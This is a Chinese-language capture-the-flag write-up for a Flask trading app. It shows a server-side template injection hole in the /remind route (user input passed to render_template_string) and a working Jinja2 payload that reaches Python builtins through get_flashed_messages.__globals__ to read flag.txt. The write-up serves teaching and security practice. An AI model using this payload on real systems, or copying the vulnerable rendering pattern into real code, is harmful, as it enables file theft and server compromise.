# WriteUp

## 1、题目描述

这是一个基于 Flask 的交易管理系统,包含用户登录、交易记录管理和提醒功能。应用使用了 SQLAlchemy 数据库,Flask-Login 进行用户认证,并在 `flag.txt` 文件中存储了 flag。目标是通过漏洞获取 flag 内容。

## 2、知识点

- **SSTI (Server-Side Template Injection)**: 服务端模板注入漏洞
- **Jinja2 模板引擎**: Flask 使用的模板引擎
- **Python 沙箱逃逸**: 通过内置对象访问敏感功能
- **Flask 上下文对象**: `get_flashed_messages` 等全局对象的使用

## 3、题目解题方法思路

### 漏洞位置分析

在 `/remind` 路由中存在明显的 SSTI 漏洞:

```python
@app.route('/remind', methods=['GET'])
@login_required
def remind():
    date = request.args.get('date')
    message = '''
    Reminder will be sent on {}
    '''.format(date)
    tmpl=render_template_string(message,date=date)  # 危险!直接渲染用户输入
    return render_template('reminder.html', message=tmpl)
```

**关键问题**:

1. 用户输入的 `date` 参数通过 `.format()` 插入到字符串中
2. 然后使用 `render_template_string()` 渲染,导致用户可以注入 Jinja2 模板语法

### 前端与后端限制分析

**前端限制**:

- reminder.html 中使用 `{{message}}` 直接输出,这里的 `message` 已经是渲染后的结果
- 前端对 date 的输入进行了限制，直接输入非法字符串会提示

```
Invalid date format. Please use YYYY-MM-DD.
```

- 但是此限制仅存在于前端，通过抓包或者修改 url 直接提交都能绕过该限制。

**后端不限制**:

- 后端 `request.args.get('date')` 直接获取 GET 参数,没有任何过滤或验证
- 没有对特殊字符进行转义
- CSRF 保护被禁用 (`app.config['WTF_CSRF_ENABLED'] = False`)

### 为什么选择 `get_flashed_messages` 打 SSTI 链?

在 Flask/Jinja2 环境中,直接使用常见的 SSTI payload (如 `{{config}}`, `{{request}}`) 可能会受到限制。`get_flashed_messages` 是一个特殊的选择,原因如下:

1. **全局可用**: `get_flashed_messages` 是 Jinja2 模板中的全局函数,在任何模板上下文中都可访问
2. **访问 globals**: 通过 `get_flashed_messages.__globals__` 可以访问 Python 全局命名空间
3. **获取 builtins**: `__globals__['__builtins__']` 包含所有 Python 内置函数,包括 `open`、`eval` 等危险函数
4. **绕过沙箱**: 这条链路可以有效绕过 Jinja2 的沙箱限制,直接访问底层 Python 功能

**SSTI 利用链**:

```
get_flashed_messages (Jinja2全局函数)
  → .__globals__ (访问函数的全局命名空间)
    → ['__builtins__'] (Python内置模块)
      → .open('flag.txt') (打开文件)
        → .read() (读取内容)
```

## 4、解题步骤

### Step 1: 访问应用并登录

1. 启动应用后访问 `http://localhost:5003`
2. 使用默认凭据登录:
   - 用户名: `user`
   - 密码: `user`

### Step 2: 测试 SSTI 漏洞

首先验证 SSTI 漏洞存在,访问:

```
http://localhost:5003/remind?date={{7*7}}
```

如果页面显示 `49`,说明模板注入成功。

### Step 3: 构造读取 flag 的 payload

根据代码,flag 存储在 `flag.txt` 文件中。构造完整的 SSTI payload:

```
{{get_flashed_messages.__globals__.__builtins__.open('flag.txt').read()}}
```

**Payload 解析**:

- `get_flashed_messages`: Flask 全局函数
- `.__globals__`: 访问函数的全局变量字典
- `.__builtins__`: 获取 Python 内置函数模块
- `.open('flag.txt')`: 调用 open 函数打开 flag.txt
- `.read()`: 读取文件内容

### Step 4: 执行攻击获取 flag

访问最终的 exploit URL:

```
http://localhost:5003/remind?date={{get_flashed_messages.__globals__.__builtins__.open('flag.txt').read()}}
```

页面将在 "Reminder will be sent on" 后显示 flag 内容。

## 5、Exp

**最终 Exploit URL**:

```
http://localhost:5003/remind?date={{get_flashed_messages.__globals__.__builtins__.open('flag.txt').read()}}
```

**注意事项**:

- 需要先登录才能访问 `/remind` 路由 (有 `@login_required` 装饰器)
- flag 格式应为 `flag{uuid}`,而非代码中的假 flag `flag{this_is_a_fake_flag}`
- 实际环境中 flag 通过环境变量 `FLAG` 注入

**成功标志**: 页面显示类似 `flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}` 格式的真实 flag。
